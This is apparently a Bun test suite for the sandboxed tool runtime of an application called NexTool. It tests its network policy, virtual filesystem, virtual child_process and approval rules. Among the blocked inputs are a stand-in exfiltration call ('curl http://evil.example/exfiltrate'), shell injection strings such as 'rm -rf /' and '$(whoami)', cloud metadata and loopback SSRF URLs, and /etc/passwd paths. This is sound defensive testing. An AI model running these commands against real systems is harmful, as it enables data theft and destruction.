/**
 * NexTool Q1 v1.0.6 test suite — tool runtime expansion, Virtual FS,
 * controlled network layer, virtual child_process, import resolver,
 * tool approval precedence and portability (spec §1-§9, §23).
 *
 * Run: bun test tests/nextool-v106.test.ts
 */

import { describe, expect, test, afterAll } from 'bun:test';
import {
  NETWORK_POLICY,
  NetworkPolicyError,
  createNetworkAccounting,
  getNetworkPolicy,
  parsePolicyUrl,
  policyFetch,
  createXhrClass,
} from '../src/lib/nexool/tools/sandbox-net';
import {
  VFS_LIMITS,
  VirtualFsError,
  getVfsLimits,
  normalizeVirtualPath,
  openVirtualFs,
  hostAccessError,
} from '../src/lib/nexool/tools/vfs';
import { createFsModule } from '../src/lib/nexool/tools/sandbox-fs';
import {
  CHILD_PROCESS_LIMITS,
  ChildProcessPolicyError,
  createChildProcessModule,
  VIRTUAL_COMMANDS,
} from '../src/lib/nexool/tools/virtual-child-process';
import { resolveToolImport, requireFromVfs, transformEsmExports } from '../src/lib/nexool/tools/import-resolver';
import { resolveAllowedModule, runNodeTool, NODE_BLOCKED_MODULES, NODE_MODULE_ALLOWLIST } from '../src/lib/nexool/tools/node-runner';
import { runJsTool } from '../src/lib/nexool/tools/js-runner';
import { resolveAutoExecute, listPendingApprovals, resolveApproval } from '../src/lib/nexool/approval';
import { exportToolJson, validateImportedTool } from '../src/lib/nexool/tool-portable';
import { buildNodeExtraLib, getNodeReferenceEntries, getReferenceEntries } from '../src/lib/nexool/tool-runtime-declarations';
import type { ToolEntry } from '../src/lib/nexool/api-contract';

// ---------- §1.3 fetch security: URL policy ----------

describe('v1.0.6 §1.3 — network policy URL validation', () => {
  test('allows http(s) public URLs', () => {
    expect(parsePolicyUrl('https://example.com/data').hostname).toBe('example.com');
    expect(parsePolicyUrl(new URL('http://example.com/x')).protocol).toBe('http:');
  });

  test('rejects non-http protocols', () => {
    for (const bad of ['ftp://example.com/x', 'file:///etc/passwd', 'data:text/html,x', 'ws://example.com']) {
      expect(() => parsePolicyUrl(bad)).toThrow(NetworkPolicyError);
      try {
        parsePolicyUrl(bad);
      } catch (e) {
        expect((e as NetworkPolicyError).code).toBe('PROTOCOL_BLOCKED');
      }
    }
  });

  test('rejects localhost and loopback (SSRF guard)', () => {
    for (const bad of ['http://localhost/api', 'http://127.0.0.1:3000/api/system', 'http://[::1]/x', 'http://0.0.0.0/x']) {
      expect(() => parsePolicyUrl(bad)).toThrow(NetworkPolicyError);
      try {
        parsePolicyUrl(bad);
      } catch (e) {
        expect((e as NetworkPolicyError).code).toBe('HOST_BLOCKED');
      }
    }
  });

  test('rejects private ranges, link-local and metadata endpoints', () => {
    for (const bad of ['http://10.1.2.3/x', 'http://192.168.1.1/x', 'http://172.16.0.9/x', 'http://169.254.169.254/latest/meta-data', 'http://100.64.0.1/x', 'http://metadata.google.internal/computeMetadata']) {
      expect(() => parsePolicyUrl(bad)).toThrow(/not allowed by the NexTool network policy/);
    }
  });

  test('rejects malformed URLs', () => {
    expect(() => parsePolicyUrl('not a url')).toThrow(NetworkPolicyError);
  });
});

// ---------- §1.2/§1.3 — policyFetch pipeline (global fetch stubbed) ----------

const realFetch = globalThis.fetch;
type MinimalFetch = (input: string | URL | Request, init?: RequestInit) => Promise<Response>;
function stubFetch(impl: MinimalFetch) {
  (globalThis as { fetch: unknown }).fetch = impl;
}

afterAll(() => {
  (globalThis as { fetch: typeof fetch }).fetch = realFetch;
});

function jsonResponse(body: string, status = 200, headers: Record<string, string> = {}) {
  return new Response(body, { status, headers: { 'content-type': 'application/json', ...headers } });
}

describe('v1.0.6 §1.2 — policyFetch (controlled fetch)', () => {
  test('returns a real Response with json()/text()/status', async () => {
    stubFetch(() => Promise.resolve(jsonResponse('{"ok":true}')));
    const res = await policyFetch('https://example.com/data', {}, createNetworkAccounting());
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ ok: true });
  });

  test('supports POST with headers/body', async () => {
    let seen: { method?: string; body?: unknown; headers?: unknown } = {};
    stubFetch((_url, init) => {
      seen = { method: init?.method, body: init?.body, headers: init?.headers };
      return Promise.resolve(jsonResponse('created', 201));
    });
    const res = await policyFetch('https://example.com/api', { method: 'POST', headers: { 'x-marker': 'v106' }, body: '{"a":1}' }, createNetworkAccounting());
    expect(res.status).toBe(201);
    expect(seen.method).toBe('POST');
    expect(seen.headers).toEqual({ 'x-marker': 'v106' });
  });

  test('enforces the per-execution request limit', async () => {
    stubFetch(() => Promise.resolve(jsonResponse('{}')));
    const accounting = createNetworkAccounting();
    for (let i = 0; i < NETWORK_POLICY.maxRequestsPerExecution; i++) {
      await policyFetch('https://example.com/x', {}, accounting);
    }
    try {
      await policyFetch('https://example.com/x', {}, accounting);
      expect.unreachable();
    } catch (e) {
      expect((e as NetworkPolicyError).code).toBe('REQUEST_LIMIT');
    }
  });

  test('rejects blocked hosts before any network call', async () => {
    let called = 0;
    stubFetch(() => {
      called += 1;
      return Promise.resolve(jsonResponse('{}'));
    });
    try {
      await policyFetch('http://127.0.0.1:3000/api/system', {}, createNetworkAccounting());
      expect.unreachable();
    } catch (e) {
      expect((e as NetworkPolicyError).code).toBe('HOST_BLOCKED');
    }
    expect(called).toBe(0);
  });

  test('caps response bodies at maxResponseBytes', async () => {
    const big = 'x'.repeat(NETWORK_POLICY.maxResponseBytes + 100);
    stubFetch(() => Promise.resolve(new Response(big)));
    try {
      await policyFetch('https://example.com/big', {}, createNetworkAccounting());
      expect.unreachable();
    } catch (e) {
      expect((e as NetworkPolicyError).code).toBe('RESPONSE_TOO_LARGE');
    }
  });

  test('limits redirect chains and re-validates every hop', async () => {
    // v1.0.8 — a chain within BOTH the redirect cap and the per-execution
    // request cap (each hop counts as a request; the shipped defaults are
    // 56 redirects / 56 requests, so long chains in tests use 3 hops).
    let hops = 0;
    stubFetch((input) => {
      hops += 1;
      const url = String(input);
      if (url.endsWith('/start') || hops <= 3) {
        return Promise.resolve(new Response(null, { status: 302, headers: { location: `https://example.com/hop${hops}` } }));
      }
      return Promise.resolve(jsonResponse('landed'));
    });
    const res = await policyFetch('https://example.com/start', {}, createNetworkAccounting());
    expect(res.status).toBe(200);
    expect(hops).toBeLessThanOrEqual(4);
  });

  test('redirect to a private host is rejected mid-chain', async () => {
    stubFetch((_input) => Promise.resolve(new Response(null, { status: 302, headers: { location: 'http://169.254.169.254/x' } })));
    try {
      await policyFetch('https://example.com/start', {}, createNetworkAccounting());
      expect.unreachable();
    } catch (e) {
      expect((e as NetworkPolicyError).code).toBe('HOST_BLOCKED');
    }
  });
});

// ---------- §1.4 — XMLHttpRequest over the same policy ----------

describe('v1.0.6 §1.4 — XMLHttpRequest implementation', () => {
  test('performs a real async GET through the policy and fires lifecycle callbacks', async () => {
    stubFetch(() => Promise.resolve(jsonResponse('{"n":1}')));
    const XHR = createXhrClass() as unknown as new () => Record<string, unknown> & {
      open(m: string, u: string): void;
      send(): void;
      readyState: number; status: number; responseText: string;
      onreadystatechange: (() => void) | null; onload: (() => void) | null;
      readonly DONE: number;
    };
    const xhr = new XHR();
    const states: number[] = [];
    let loaded = false;
    xhr.onreadystatechange = () => states.push(xhr.readyState);
    xhr.onload = () => {
      loaded = true;
    };
    xhr.open('GET', 'https://example.com/data');
    xhr.send();
    await new Promise((r) => setTimeout(r, 50));
    expect(loaded).toBe(true);
    expect(xhr.readyState).toBe(xhr.DONE);
    expect(xhr.status).toBe(200);
    expect(xhr.responseText).toBe('{"n":1}');
    expect(states.length).toBeGreaterThan(1);
  }, 20_000);

  test('rejects synchronous mode honestly', () => {
    const XHR = createXhrClass() as unknown as new () => Record<string, unknown> & {
      open(m: string, u: string, a?: boolean): void; send(): void;
    };
    const xhr = new XHR();
    xhr.open('GET', 'https://example.com/x', false);
    expect(() => xhr.send()).toThrow(/Synchronous XMLHttpRequest/);
  });

  test('blocked hosts reach onerror with the policy code', async () => {
    const XHR = createXhrClass() as unknown as new () => Record<string, unknown> & {
      open(m: string, u: string): void; send(): void;
      onerror: ((ev?: { code?: string }) => void) | null;
    };
    const xhr = new XHR();
    let code = '';
    xhr.onerror = (ev) => {
      code = (ev as { code?: string })?.code ?? '';
    };
    xhr.open('GET', 'http://localhost/secret');
    xhr.send();
    await new Promise((r) => setTimeout(r, 50));
    expect(code).toBe('HOST_BLOCKED');
  }, 20_000);
});

// ---------- §2.5/§2.6 — VFS path validation ----------

describe('v1.0.6 §2.6 — VFS path traversal protection', () => {
  test('normalizes relative and dotted paths into the virtual root', () => {
    expect(normalizeVirtualPath('/workspace/./a.txt')).toBe('/workspace/a.txt');
    expect(normalizeVirtualPath('data/x.json')).toBe('/data/x.json');
    expect(normalizeVirtualPath('/data/sub/../y.txt')).toBe('/data/y.txt');
  });

  test('decodes encoded traversal before validating', () => {
    // in-root encoded dots normalize harmlessly; escapes are rejected
    expect(normalizeVirtualPath('/data/%2e%2e/secret')).toBe('/secret');
    expect(() => normalizeVirtualPath('/data/%2e%2e/%2e%2e/secret')).toThrow(VirtualFsError);
  });

  test('rejects .. beyond the virtual root with the documented error', () => {
    try {
      normalizeVirtualPath('/../../etc/passwd');
      expect.unreachable();
    } catch (e) {
      expect((e as VirtualFsError).code).toBe('VFS_ACCESS');
      expect((e as Error).name).toBe('VirtualFSAccessError');
      expect((e as Error).message).toContain('Access to the NexTool host filesystem is not permitted');
    }
  });

  test('rejects host escapes: URL paths, backslashes, NUL bytes', () => {
    expect(() => normalizeVirtualPath('file:///etc/passwd')).toThrow(/URL filesystem paths are not permitted/);
    expect(() => normalizeVirtualPath('C:\\Windows\\system32')).toThrow(/backslash paths are not permitted/);
    expect(() => normalizeVirtualPath('/data/a\0b')).toThrow(/NUL byte/);
    expect(hostAccessError('x').code).toBe('VFS_ACCESS');
  });

  test('enforces depth and length limits', () => {
    expect(() => normalizeVirtualPath(`/${'a/'.repeat(getVfsLimits().maxDepth + 1)}x`)).toThrow(/maximum depth/);
    expect(() => normalizeVirtualPath(`/${'a'.repeat(getVfsLimits().maxPathLength + 1)}`)).toThrow(/maximum length/);
  });
});

// ---------- §2.3/§2.7/§2.8/§2.9 — real VFS CRUD (DB-backed, per-tool) ----------

const SCRATCH = `__v106test_${Date.now().toString(36)}`;

describe('v1.0.6 §2.7 — Virtual FS stores and retrieves real files', () => {
  const sessionP = openVirtualFs(SCRATCH);

  test('workspace scaffold exists (§2.1)', async () => {
    const s = await sessionP;
    for (const dir of ['/input', '/output', '/tmp', '/data', '/workspace']) {
      expect(s.exists(dir)).toBe(true);
      expect(s.stat(dir).kind).toBe('dir');
    }
  });

  test('create/read/update/delete/list round trip', async () => {
    const s = await sessionP;
    s.writeFile('/workspace/report.txt', 'v1');
    expect(s.readFile('/workspace/report.txt', 'utf8')).toBe('v1');
    s.appendFile('/workspace/report.txt', '+v2');
    expect(s.readFile('/workspace/report.txt', 'utf8')).toBe('v1+v2');
    expect(s.readdir('/workspace')).toContain('report.txt');
    const meta = s.stat('/workspace/report.txt');
    expect(meta.kind).toBe('file');
    expect(meta.size).toBe(5);
    s.rename('/workspace/report.txt', '/output/final.txt');
    expect(s.exists('/workspace/report.txt')).toBe(false);
    expect(s.exists('/output/final.txt')).toBe(true);
    s.copy('/output/final.txt', '/data/copy.txt');
    expect(s.readFile('/data/copy.txt', 'utf8')).toBe('v1+v2');
    s.unlink('/data/copy.txt');
    expect(s.exists('/data/copy.txt')).toBe(false);
    s.rm('/output/final.txt');
    expect(s.exists('/output/final.txt')).toBe(false);
  });

  test('mkdir recursive + realpath + implicit parents', async () => {
    const s = await sessionP;
    s.mkdir('/data/a/b/c', { recursive: true });
    expect(s.exists('/data/a/b/c')).toBe(true);
    s.writeFile('/data/a/b/c/note.txt', 'deep');
    expect(s.realpath('/data/a/b/c/note.txt')).toBe('/data/a/b/c/note.txt');
    expect(s.readdir('/data/a/b')).toEqual(['c']);
  });

  test('binary-safe base64 storage round trip', async () => {
    const s = await sessionP;
    const bin = Buffer.from([0, 1, 2, 254, 255]);
    s.writeFile('/tmp/blob.bin', bin);
    const back = s.readFile('/tmp/blob.bin') as Buffer;
    expect(Buffer.compare(back, bin)).toBe(0);
  });

  test('ENOENT / EISDIR / ENOTEMPTY errors are Node-shaped', async () => {
    const s = await sessionP;
    expect(() => s.readFile('/nope/missing.txt')).toThrow(/ENOENT/);
    expect(() => s.readFile('/workspace', 'utf8')).toThrow(/EISDIR/);
    s.writeFile('/tmp/dirfile.txt', 'x');
    s.mkdir('/tmp/fulldir', { recursive: true });
    s.writeFile('/tmp/fulldir/inner.txt', 'x');
    expect(() => s.unlink('/tmp/fulldir')).toThrow(/EISDIR/);
    expect(() => s.rm('/tmp/fulldir')).toThrow(/ENOTEMPTY/);
    s.rm('/tmp/fulldir', { recursive: true });
    expect(s.exists('/tmp/fulldir')).toBe(false);
  });

  test('§2.9 — file-size and total-size limits are enforced (v1.0.8: limits resolved live)', async () => {
    const s = await sessionP;
    // v1.0.8 — enforcement uses the LIVE central limits (getVfsLimits());
    // the shipped per-file cap is now 2 MiB.
    const live = getVfsLimits();
    expect(() => s.writeFile('/tmp/big.bin', Buffer.alloc(live.maxFileBytes + 1))).toThrow(/maximum file size/);
    expect(() => s.readFile('/tmp/blob.bin', 'utf8')).toBeDefined();
    const usage = s.usage();
    expect(usage.usedBytes).toBeGreaterThan(0);
    expect(usage.files).toBeGreaterThan(0);
    expect(usage.limits).toEqual(live);
  });

  test('sandbox fs module exposes promise + promises + sync surfaces (§2.3)', async () => {
    const s = await sessionP;
    const fs = createFsModule(s) as Record<string, (...a: unknown[]) => unknown> & { promises: Record<string, (...a: unknown[]) => unknown> };
    fs.writeFileSync('/workspace/sf.txt', 'sync');
    expect(fs.readFileSync('/workspace/sf.txt', 'utf8')).toBe('sync');
    await fs.writeFile('/workspace/pf.txt', 'promise');
    expect(await fs.readFile('/workspace/pf.txt', 'utf8')).toBe('promise');
    expect(await fs.promises.readFile('/workspace/pf.txt', 'utf8')).toBe('promise');
    expect(await fs.exists('/workspace/pf.txt')).toBe(true);
    // callback style tolerated
    await new Promise<void>((resolve) => {
      fs.readFile('/workspace/sf.txt', 'utf8', (err: unknown, data: unknown) => {
        expect(err).toBeNull();
        expect(data).toBe('sync');
        resolve();
      });
    });
  });
});

// ---------- §4 — virtual child_process ----------

describe('v1.0.6 §4 — child_process restricted virtual layer', () => {
  const sessionP = openVirtualFs(SCRATCH);
  // process counter is per EXECUTION (one tool run) — each exec call here is
  // its own execution, so every test starts from a fresh counter.
  const counter = () => ({ n: 0 });

  test('executes allowed virtual commands against the VFS workspace', async () => {
    const s = await sessionP;
    s.writeFile('/workspace/lines.txt', 'b\na\nc\na\n');
    // each exec call = one fresh execution (fresh process budget)
    const exec = async (cmd: string) => {
      const cp = createChildProcessModule(s, counter()) as Record<string, (...a: unknown[]) => unknown>;
      return (await cp.exec(cmd)) as { stdout: string };
    };
    expect((await exec('pwd')).stdout.trim()).toBe('/workspace');
    expect((await exec('echo hello v106')).stdout).toBe('hello v106\n');
    expect((await exec('cat lines.txt')).stdout).toBe('b\na\nc\na\n');
    expect((await exec('sort lines.txt')).stdout).toBe('a\na\nb\nc\n');
    expect((await exec('uniq /workspace/lines.txt')).stdout).toBe('b\na\nc\na\n');
    expect((await exec('wc -l lines.txt')).stdout.trim()).toBe('4');
    expect((await exec('grep a lines.txt')).stdout).toBe('a\na\n');
    // one execution: three pipe stages stay within the 4-process budget
    expect((await exec('cat lines.txt | sort | uniq')).stdout).toBe('a\nb\nc\n');
    expect((await exec('ls /workspace')).stdout).toContain('lines.txt');
  });

  test('unknown commands fail safely with exit code 127 (§4.2/§4.3)', async () => {
    const s = await sessionP;
    const cp = createChildProcessModule(s, counter()) as unknown as Record<string, (cmd: string) => Promise<{ code?: number; stderr?: string; message?: string }>>;
    const res = await cp.exec('curl http://evil.example/exfiltrate').catch((e: { code?: number; stderr?: string; message?: string }) => ({ code: e.code ?? -1, stderr: e.stderr ?? '', message: e.message ?? '' }));
    expect(res.code).toBe(127);
    expect(res.stderr).toContain('not available');
    expect(res.stderr).toContain('virtual');
  });

  test('shell metacharacters are rejected outright (§4.3)', async () => {
    const s = await sessionP;
    const cp = createChildProcessModule(s, counter()) as unknown as Record<string, (cmd: string) => Promise<{ code?: number; message?: string }>>;
    for (const bad of ['echo hi && rm -rf /', 'cat a; cat b', 'echo `id`', 'echo $(whoami)', 'echo x > /etc/passwd']) {
      const res = await cp.exec(bad).catch((e: { code?: number; message?: string }) => ({ code: e.code ?? -1, message: e.message ?? '' }));
      expect(res.code).toBe(126);
      expect(res.message).toContain('not permitted');
    }
  });

  test('exposes exactly the documented API subset (§4.4)', async () => {
    const s = await sessionP;
    const cp = createChildProcessModule(s, counter()) as unknown as Record<string, (...a: unknown[]) => unknown> & {
      spawnSync: (cmd: string, args?: string[]) => { status: number; stdout: string };
    };
    for (const k of ['exec', 'execSync', 'execFile', 'spawn', 'spawnSync']) {
      expect(typeof cp[k]).toBe('function');
    }
    const sync = cp.spawnSync('echo', ['sync-ok']);
    expect(sync.status).toBe(0);
    expect(sync.stdout).toBe('sync-ok\n');
  });

  test('documented limits and command vocabulary', () => {
    expect(CHILD_PROCESS_LIMITS.timeoutMs).toBe(8000);
    expect(CHILD_PROCESS_LIMITS.maxOutputBytes).toBe(64 * 1024);
    // v1.0.8 — raised to 64 so realistic multi-command workflows (§3.11) fit one execution.
    expect(CHILD_PROCESS_LIMITS.maxProcessesPerExecution).toBe(64);
    expect(VIRTUAL_COMMANDS).toContain('ls');
    expect(VIRTUAL_COMMANDS).not.toContain('curl');
    expect(VIRTUAL_COMMANDS).not.toContain('sh');
  });
});

// ---------- §6 — import resolver ----------

describe('v1.0.6 §6 — centralized import resolver', () => {
  const sessionP = openVirtualFs(SCRATCH);

  test('CommonJS require + dynamic import resolve allowlisted modules identically', async () => {
    const crypto = resolveAllowedModule('crypto');
    expect(typeof (crypto as { randomUUID: () => string }).randomUUID).toBe('function');
    expect(resolveAllowedModule('node:path')).toBe(resolveAllowedModule('path'));
    const mod = await resolveToolImport('crypto', { accounting: createNetworkAccounting(), moduleCache: new Map() });
    expect(mod).toBe(crypto);
  });

  test('blocked modules keep the pointed wording', () => {
    for (const name of ['cluster', 'vm', 'worker_threads', 'net', 'dgram', 'dns', 'process']) {
      expect(() => resolveAllowedModule(name)).toThrow(new RegExp(`Module "${name}" is not available`));
      expect(NODE_BLOCKED_MODULES[name]).toBeTruthy();
    }
    expect(() => resolveAllowedModule('made-up-module')).toThrow(/Allowed modules:/);
  });

  test('VFS modules import via require AND await import (§6.4)', async () => {
    const s = await sessionP;
    const ctx = { toolId: SCRATCH, vfs: s, accounting: createNetworkAccounting(), moduleCache: new Map<string, unknown>() };
    s.writeFile('/workspace/config.json', '{"who":"vfs"}');
    s.writeFile('/workspace/helper.js', 'module.exports.double = (n) => n * 2;');
    const cfg = requireFromVfs(ctx, '/workspace/execute.js', './config.json') as { who: string };
    expect(cfg.who).toBe('vfs');
    const helper = requireFromVfs(ctx, '/workspace/execute.js', './helper.js') as { double: (n: number) => number };
    expect(helper.double(21)).toBe(42);
    const imported = (await resolveToolImport('./helper.js', ctx)) as { double: (n: number) => number };
    expect(imported.double(5)).toBe(10);
  });

  test('ESM exports transform covers default/named/braces forms', () => {
    const out = transformEsmExports([
      'export const limit = 10;',
      'export function double(n) { return n * 2; }',
      'export { limit as max };\n',
      'export default { kind: "cfg" };',
    ].join('\n'));
    const assign = /Object\.assign\(module\.exports, \{(.*)\}\)/.exec(out)?.[1] ?? '';
    expect(assign).toContain('limit: max');       // braces alias
    expect(assign).toContain('limit: limit');     // export const
    expect(assign).toContain('double: double');   // export function
    expect(out).toContain('module.exports.default');
    expect(out).not.toMatch(/export\s+default/);
    expect(out).not.toMatch(/export\s+\{/);
  });

  test('URL imports are policy-gated (v1.0.8: enabled by default through the central policy)', async () => {
    // v1.0.8 §4.5 — URL imports are ENABLED by default; the gate is now the
    // central network policy (network.allowUrlImports), checked live.
    expect(getNetworkPolicy().urlImportsEnabled).toBe(true);
    // A blocked protocol still never becomes a hidden path to host resources.
    try {
      await resolveToolImport('file:///etc/passwd', { accounting: createNetworkAccounting(), moduleCache: new Map() });
      expect.unreachable();
    } catch (e) {
      const message = (e as Error).message;
      expect(message).toContain('file');
    }
  });

  test('missing VFS modules fail with a pointed error', async () => {
    const s = await sessionP;
    const ctx = { toolId: SCRATCH, vfs: s, accounting: createNetworkAccounting(), moduleCache: new Map<string, unknown>() };
    try {
      await resolveToolImport('./does-not-exist.js', ctx);
      expect.unreachable();
    } catch (e) {
      expect((e as Error).message).toContain("Cannot find module './does-not-exist.js'");
    }
  });
});

// ---------- §1/§2/§5 — sandbox execution (nodejs + js-function) ----------

describe('v1.0.6 — nodejs sandbox executes the expanded runtime', () => {
  test('fs + timers + alert/prompt(test) + fetch policy work end-to-end', async () => {
    stubFetch(() => Promise.resolve(jsonResponse('{"source":"stub"}')));
    const vfs = await openVirtualFs(`${SCRATCH}_run`);
    const run = await runNodeTool(
      [
        "const fs = require('fs');",
        'async function execute(params, context) {',
        "  fs.writeFileSync('/output/x.txt', 'written-in-sandbox');",
        "  const back = fs.readFileSync('/output/x.txt', 'utf8');",
        '  await new Promise((r) => setTimeout(r, 5));',
        "  await alert('sandbox alert');",
        "  const answer = await prompt('answer me', 'test-default');",
        '  let host = "ok";',
        "  try { await fetch('http://127.0.0.1:1/x'); } catch (e) { host = e.code || 'ERR'; }",
        "  return { back, answer, host, up: typeof setTimeout === 'function' };",
        '}',
      ].join('\n'),
      {},
      { executionId: 't_node', mode: 'test', now: new Date().toISOString(), log: () => {} },
      { toolId: `${SCRATCH}_run`, vfs },
    );
    expect(run.ok).toBe(true);
    const r = run.result as Record<string, unknown>;
    expect(r.back).toBe('written-in-sandbox');
    expect(r.answer).toBe('test-default');
    expect(r.host).toBe('HOST_BLOCKED');
    expect(r.up).toBe(true);
    // the scratch workspace must contain the write (real VFS, not a stub)
    expect(vfs.readFile('/output/x.txt', 'utf8')).toBe('written-in-sandbox');
  }, 30_000);

  test('require of virtual modules: os is virtualized, child_process is the VFS layer', async () => {
    const vfs = await openVirtualFs(`${SCRATCH}_cp`);
    const run = await runNodeTool(
      [
        "const os = require('os');",
        "const cp = require('child_process');",
        'async function execute(params, context) {',
        "  const who = await cp.exec('echo v106');",
        "  return { platform: os.platform(), hostname: os.hostname(), out: who.stdout.trim() };",
        '}',
      ].join('\n'),
      {},
      { executionId: 't_node2', mode: 'test', now: new Date().toISOString(), log: () => {} },
      { toolId: `${SCRATCH}_cp`, vfs },
    );
    expect(run.ok).toBe(true);
    const r = run.result as Record<string, unknown>;
    expect(r.platform).toBe('nextool-virtual');
    expect(r.hostname).toBe('nextool-sandbox');
    expect(r.out).toBe('v106');
  }, 30_000);

  test('ESM dynamic import() of a VFS module works through the resolver', async () => {
    const vfs = await openVirtualFs(`${SCRATCH}_esm`);
    vfs.writeFile('/workspace/esm-helper.js', 'export default function greet(name) { return `hi ${name}`; }\nexport const version = 106;');
    const run = await runNodeTool(
      [
        'async function execute(params, context) {',
        "  const mod = await import('./esm-helper.js');",
        '  return { greet: mod.default("vfs"), version: mod.version };',
        '}',
      ].join('\n'),
      {},
      { executionId: 't_node3', mode: 'test', now: new Date().toISOString(), log: () => {} },
      { toolId: `${SCRATCH}_esm`, vfs },
    );
    expect(run.ok).toBe(true);
    expect(run.result).toEqual({ greet: 'hi vfs', version: 106 });
  }, 30_000);

  test('§7.2 — js-function require() stays NARROW (VFS only, no Node modules)', async () => {
    const vfs = await openVirtualFs(`${SCRATCH}_js`);
    vfs.writeFile('/workspace/tiny.js', 'module.exports.v = 106;');
    const good = await runJsTool(
      'async function execute(p, c) { const m = require("./tiny.js"); return { v: m.v }; }',
      {},
      { executionId: 't_js1', mode: 'test', now: new Date().toISOString(), log: () => {} },
      { toolId: `${SCRATCH}_js`, vfs },
    );
    expect(good.ok).toBe(true);
    expect((good.result as Record<string, unknown>).v).toBe(106);

    const bad = await runJsTool(
      'async function execute(p, c) { return require("crypto").randomUUID(); }',
      {},
      { executionId: 't_js2', mode: 'test', now: new Date().toISOString(), log: () => {} },
      { toolId: `${SCRATCH}_js`, vfs },
    );
    expect(bad.ok).toBe(false);
    expect(bad.error?.message).toContain('lightweight restricted runtime');
  }, 30_000);

  test('v1.0.5 regression — no-await infinite loop still times out without freezing', async () => {
    const run = await runJsTool(
      'async function execute(p, c) { while (true) {} }',
      {},
      { executionId: 't_loop', mode: 'test', now: new Date().toISOString(), log: () => {} },
    );
    expect(run.ok).toBe(false);
    expect(run.error?.code).toBe('TIMEOUT');
  }, 30_000);

  test('allowlist now includes the virtual capability modules (§5/§8)', () => {
    for (const m of ['fs', 'os', 'timers', 'timers/promises', 'http', 'https', 'child_process']) {
      expect(NODE_MODULE_ALLOWLIST[m]?.virtual).toBe(true);
    }
    expect(NODE_BLOCKED_MODULES.worker_threads).toBeTruthy();
  });
});

// ---------- §9 — approval precedence ----------

describe('v1.0.6 §9.4 — auto-execute precedence (global → task → tool)', () => {
  test('global true overrides everything', () => {
    expect(resolveAutoExecute({ autoExecute: false }, { autoExecuteTools: false }, { autoExecuteTools: true })).toBe(true);
    expect(resolveAutoExecute({ autoExecute: false }, { autoExecuteTools: true }, { autoExecuteTools: false })).toBe(true);
  });

  test('task true overrides tool false', () => {
    expect(resolveAutoExecute({ autoExecute: false }, { autoExecuteTools: true }, { autoExecuteTools: false })).toBe(true);
  });

  test('per-tool config decides when global/task are false', () => {
    expect(resolveAutoExecute({ autoExecute: true }, { autoExecuteTools: false }, { autoExecuteTools: false })).toBe(true);
    expect(resolveAutoExecute({ autoExecute: false }, { autoExecuteTools: false }, { autoExecuteTools: false })).toBe(false);
  });

  test('§9.1/§23 documented default: missing autoExecute ⇒ false (approval required)', () => {
    expect(resolveAutoExecute({}, undefined, { autoExecuteTools: false })).toBe(false);
    expect(resolveAutoExecute({ autoExecute: undefined }, {}, { autoExecuteTools: false })).toBe(false);
  });

  test('approval registry + deny resolution flow', async () => {
    const { requestApproval } = await import('../src/lib/nexool/approval');
    const pending = requestApproval({ taskId: 'task_v106test', tool: 'echo.echo', params: { message: 'x' } });
    const list = listPendingApprovals('task_v106test');
    expect(list.length).toBe(1);
    expect(list[0].tool).toBe('echo.echo');
    const resolved = await resolveApproval(list[0].approvalId, 'deny', 'not safe');
    expect(resolved).toBe(true);
    expect(await pending).toBe('denied');
    expect(listPendingApprovals('task_v106test').length).toBe(0);
    expect((await resolveApproval('apr_missing', 'allow'))).toBe(false);
  });
});

// ---------- §9.2/§23 — per-tool autoExecute portability ----------

describe('v1.0.6 §9.2/§23 — autoExecute export/import compatibility', () => {
  const baseEntry = {
    name: 'ops.v106portable',
    description: 'portability probe',
    category: 'utility',
    environment: 'nodejs' as const,
    schema: { type: 'object' as const, properties: [] },
    functionSource: 'async function execute(p, c) { return 1; }',
    enabled: true,
    stats: { callCount: 0, successCount: 0, failureCount: 0, timeoutCount: 0, avgMs: 0, enabled: true },
  };

  test('export carries autoExecute; import validates and round-trips it', () => {
    const entry = { ...baseEntry, autoExecute: true } as unknown as ToolEntry;
    const exported = exportToolJson(entry, '1.0.6');
    expect(exported.autoExecute).toBe(true);
    const validated = validateImportedTool(exported);
    expect(validated.ok).toBe(true);
    expect(validated.tool?.autoExecute).toBe(true);
  });

  test('tools WITHOUT autoExecute import cleanly and default to false (§23)', () => {
    const validated = validateImportedTool(baseEntry);
    expect(validated.ok).toBe(true);
    expect(validated.tool?.autoExecute).toBeUndefined();
  });
});

// ---------- §5.1/§5.2/§8/§17 — declarations + reference surface ----------

describe('v1.0.6 §5.2/§8 — IntelliSense reflects the actual runtime', () => {
  test('nodejs extraLib includes virtual modules and common APIs, never blocked ones', () => {
    const lib = buildNodeExtraLib(null, { modules: NODE_MODULE_ALLOWLIST });
    for (const m of ['fs', 'child_process', 'http', 'os', 'timers']) {
      expect(lib).toContain(`require(id: '${m}')`);
    }
    expect(lib).toContain('declare function fetch(');
    expect(lib).toContain('declare function alert(');
    expect(lib).toContain('declare function prompt(');
    expect(lib).not.toContain("require(id: 'cluster')");
    expect(lib).not.toContain("require(id: 'worker_threads')");
  });

  test('reference entries document fetch/alert/prompt for BOTH environments', () => {
    const jsEntries = getReferenceEntries(null).map((e) => e.name);
    const nodeEntries = getNodeReferenceEntries(null).map((e) => e.name);
    expect(jsEntries.some((n) => n.includes('fetch'))).toBe(true);
    expect(jsEntries.some((n) => n.includes('alert'))).toBe(true);
    expect(jsEntries.some((n) => n.includes('prompt'))).toBe(true);
    expect(nodeEntries).toContain('require("fs")');
    expect(nodeEntries).toContain('require("child_process")');
  });
});
